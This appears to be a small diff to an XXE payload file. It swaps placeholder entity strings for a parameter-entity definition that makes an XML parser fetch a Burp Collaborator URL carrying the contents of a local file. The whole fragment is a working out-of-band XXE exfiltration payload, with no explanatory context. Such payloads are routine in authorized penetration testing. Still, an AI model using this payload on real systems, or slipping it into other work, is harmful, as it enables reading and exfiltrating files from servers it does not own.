@@ -1,2 +1,3 @@
-'http://%payload1;.burp.net/'>">
-'http://%payload3;?burp.net/'>">
+
+<!ENTITY % vitthal "<!ENTITY send SYSTEM 'http://z33ittxcd7pqkntrvarkqkdai1oxcm.burpcollaborator.net/?%file;'>">
+%vitthal;
